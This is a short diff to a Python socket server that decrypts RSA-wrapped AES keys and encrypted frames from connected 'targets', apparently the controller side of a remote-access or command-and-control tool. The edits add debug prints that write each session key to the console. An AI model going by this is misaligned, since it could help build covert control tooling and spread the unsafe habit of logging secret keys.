@@ -133,9 +133,9 @@ def server():
 
                     length_bytes = elem.recv(5)
                     
-                    print(length_bytes)
+                    # print(length_bytes)
                     
-                    length = struct.unpack("<IB", length_bytes)[0] #error when target is disconnected
+                    length = struct.unpack("<I", length_bytes[:4])[0] #error when target is disconnected
                     frame = elem.recv(length)
                     
                     
@@ -152,6 +152,8 @@ def server():
                         case 0x01:
                             aes_key = rsa_decryption(private_key, ciphertext)
                             dict_ip[nom_cible] = (elem, True, aes_key)
+                            print(dict_ip[nom_cible][2])
+                            print("key imported line 156")
                         case 0x02:
                             plaintext = aes_decrypt(dict_ip[nom_cible][2], ciphertext)
                             
@@ -179,6 +181,8 @@ def server():
                                 case 0x01:
                                     aes_key = rsa_decryption(private_key, ciphertext)
                                     dict_ip[nom_cible] = (elem, True, aes_key)
+                                    print("key imported line 183")
+                                    print(dict_ip[nom_cible][2])
                                 case 0x02:
                                     plaintext = aes_decrypt(
                                         dict_ip[nom_cible][2], ciphertext
